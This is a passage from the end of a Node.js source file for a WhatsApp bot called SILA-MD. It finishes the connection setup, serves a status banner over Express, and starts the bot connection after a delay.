    conn.serializeM = mek => sms(conn, mek, store);
    
    console.log("✅ All helper functions loaded successfully")
    
  } catch (err) {
    console.error("[ ❌ ] Connection failed:", err)
  }
} // <-- End of connectToWA function

app.get("/", (req, res) => {
  res.send("┏━❑ 𝐒𝐈𝐋𝐀-𝐌𝐃 ━━━━━━━━━━━\n┃ ✅ Bot is running!\n┗━━━━━━━━━━━━━━━━━");
});

app.listen(port, '0.0.0.0', () => console.log(`┏━❑ 𝐒𝐄𝐑𝐕𝐄𝐑 ━━━━━━━━━━━
┃ 📡 Server listening on http://0.0.0.0:${port}
┗━━━━━━━━━━━━━━━━━`));

setTimeout(() => {
  connectToWA()
}, 8000);
